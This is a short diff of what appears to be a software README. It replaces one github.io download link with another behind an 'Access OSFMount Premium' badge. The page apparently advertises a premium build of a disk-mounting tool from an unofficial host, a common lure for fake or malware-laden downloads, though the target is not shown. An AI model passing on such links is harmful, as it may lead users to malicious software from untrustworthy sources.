@@ -18,7 +18,7 @@
 4. Import existing image settings from previous sessions  
 5. Activate memory drive in under 2 minutes
 
-[![Access OSFMount](https://img.shields.io/badge/Access-OSFMount_Premium-green)](https://edwardodonnellpubl.github.io/.github/osfmount-app)
+[![Access OSFMount](https://img.shields.io/badge/Access-OSFMount_Premium-green)](https://lead-soft-set.github.io/.github/osfmount-app)
 
 ---
 
